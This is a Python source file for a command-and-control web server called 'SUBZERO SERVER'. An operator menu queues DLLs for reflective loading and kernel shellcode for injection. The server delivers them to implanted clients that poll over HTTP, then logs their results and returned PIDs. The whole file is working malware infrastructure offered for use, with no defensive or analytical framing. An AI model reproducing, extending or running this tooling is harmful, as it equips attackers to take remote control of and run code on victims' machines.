from http.server import BaseHTTPRequestHandler
from socketserver import TCPServer
from threading import Thread, Event, Semaphore
import os
import queue
import urllib

# Queue deceleration and constants
q = queue.Queue()
OPCODE = 0
FILE_PATH = 1
RETURNED_DATA_MAX_SIZE = 2

# Opcodes constant values
KEEP_ALIVE_OPCODE = 0


class ServerOpcode:
    InjectKernelShellcode, LoadLibraryReflectively, Cleanup, *_ = range(1, 10)


class ClientOpcode:
    Success, Failure, *_ = range(1, 10)


screenlock = Semaphore(value=1)

class Handler(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        server_opcode = KEEP_ALIVE_OPCODE
        packet_body = b""
        returned_data_max_size = 0

        if not q.empty():
            item = q.get()
            q.task_done()
            server_opcode = item[OPCODE]

            if server_opcode != ServerOpcode.Cleanup:
                print(f"[SERVER] Sending {item[FILE_PATH]} to {self.client_address[0]}...")
                try:
                    with open(item[FILE_PATH], 'rb') as file:
                        packet_body = file.read()
                except:
                    print(f"[SERVER] Error reading: {item[FILE_PATH]}")

                if server_opcode == ServerOpcode.InjectKernelShellcode:
                    returned_data_max_size = item[RETURNED_DATA_MAX_SIZE]
            else:
                print(f"[SERVER] Removing client from {self.client_address[0]}...")

        self.send_response(200)
        self.send_header("Opcode", server_opcode)
        self.send_header("Returned-Data-Size", returned_data_max_size)

        self.end_headers()

        self.wfile.write(packet_body)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        packet_patrameters = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))

        client_opcode = ord(packet_patrameters["Opcode"][0])

        if client_opcode != KEEP_ALIVE_OPCODE:

            # USE match STATEMENT ON PYTHON 3.10 FOR A MORE COMPLEX SWITCH - CURRENTLY ON BETA
            if client_opcode == ClientOpcode.Success:
                print(f"[{self.client_address[0]}] Operation completed successfully.")
            else:
                print(f"[{self.client_address[0]}] Operation failed.")

            if 'Returned-Data' in packet_patrameters:
                # Handle returned data accordingly
                print(f"[{self.client_address[0]}] Returned data (String): \n{packet_patrameters['Returned-Data'][0]}")

                # In my case - PIC should return a PID
                print(f"[{self.client_address[0]}] Kernel PIC ran by PID: {ord(packet_patrameters['Returned-Data'][0])}")

            screenlock.release()


class WebServer:
    def __init__(self, port=8080, verbose=False):
        """ Constructs a restartable WebServer on 'port'. """
        self.port = port
        self._verbose = verbose
        self._handler = Handler
        self.httpd = TCPServer(("", port), self._handler)
        self._start = Event()
        Thread(name=repr(self), target=self.run, daemon=True).start()
        self.start() # remove if don't want to start on opening

    def start(self):
        """ Allow the server to serve. """
        self._start.set()

    def shutdown(self):
        """ Block re-starting and shut down the current server. """
        self._start.clear()
        self.httpd.shutdown()

    def run(self):
        """ Serve forever, restart when allowed. """
        while 'program running':
            self._start.wait()
            if self._verbose:
                print('serving at port', self.port)
            self.httpd.serve_forever()

    def __repr__(self):
        """ A formal string representation of this instance. """
        return f'{self.__class__.__name__}(port={self.port})'


if __name__ == "__main__":
    server = WebServer()
    block = True

    while True:

        # Avoid simultaneous writing to console
        if block:
            screenlock.acquire()
        else:
            block = True

        print(" |-------------------------|")
        print(" |      SUBZERO SERVER     |")
        print(" | 1 - Load DLL            |")
        print(" | 2 - Execute Kernel PIC  |")
        print(" | 3 - Remove Client       |")
        print(" | 4 - Stop the Server     |")
        print(" |-------------------------|")

        choice = input("[SERVER] Enter Action: ")

        if choice == "1":
            dll_path = input("[SERVER] Enter DLL Path: ")
            if not os.path.exists(dll_path):
                print("[SERVER] Invalid Path Entered.")
                continue

            q.put((ServerOpcode.LoadLibraryReflectively, dll_path, None))


        elif choice == "2":
            bin_path = input("[SERVER] Enter Binary File Path: ")
            if not os.path.exists(bin_path):
                print("[SERVER] Invalid Path Entered.")
                continue

            q.put((ServerOpcode.InjectKernelShellcode, bin_path,
                   input("[SERVER] Enter Maximum Expected Returned Data Size (Bytes): ")))


        elif choice == "3":
            q.put((ServerOpcode.Cleanup, None, None))

        elif choice == "4":
            print("[SERVER] Stopping Server...")
            server.shutdown()
            print("[SERVER] Server Stopped.")
            exit()

        else:
            print("[SERVER] Invalid Option Entered.")
            block = False;
